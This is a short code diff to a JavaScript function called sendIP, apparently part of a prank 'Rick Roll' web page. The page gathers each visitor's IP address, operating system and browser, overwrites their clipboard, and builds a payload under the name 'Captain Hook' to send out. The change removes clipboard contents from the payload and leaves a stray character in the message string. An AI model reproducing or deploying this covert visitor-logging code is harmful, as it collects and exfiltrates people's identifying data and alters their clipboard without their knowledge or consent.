@@ -36,11 +36,11 @@ async function sendIP() {
         console.error("Error");
       });
 
-      const clipboard = await navigator.clipboard.writeText("Get Rick Rolled lol");
+      const clipboard = await navigator.clipboard.writeText("Get Rick Rolled");
 
     //create payload
     const payload = {
-      content: `IP: ${ip}, OS: ${os}, Browser: ${browser}, Clipboard: ${clipboard}`,
+      content: `IP: ${ip}, OS: ${os}, Browser: ${browser}S`,
       username: 'Captain Hook'
     };
 
